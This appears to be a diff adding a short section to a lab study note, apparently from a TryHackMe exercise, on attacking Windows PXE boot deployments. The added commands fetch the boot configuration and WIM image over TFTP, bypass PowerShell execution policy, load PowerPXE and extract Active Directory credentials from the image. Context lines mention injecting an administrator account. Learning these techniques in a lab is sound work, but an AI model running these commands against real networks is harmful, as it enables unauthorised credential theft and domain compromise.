@@ -152,4 +152,22 @@ Once the process is performed, the client will use a TFTP connection to download
 - Inject a privilege escalation vector, such as a Local Administrator account, to gain Administrative access to the OS once the PXE boot has been completed.
 - Perform password scraping attacks to recover AD credentials used during the install.:w
 
+### PXE Boot Image Retrieval:
+
+```powershell
+tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
+powershell -executionpolicy bypass
+Import-Module .\PowerPXE.ps1
+$BCDFile = "conf.bcd"
+# Identify wim file : <PXE Boot Image Location>
+Get-WimFile -bcdFile $BCDFile
+
+# WIM files are bootable images in the Windows Imaging Format (WIM). Now that we have the location of the PXE Boot image, we can again use TFTP to download this image:
+ tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
+
+# Recovering credential
+Get-FindCredentials -WimFile pxeboot.wim
+```
+
+Done
 
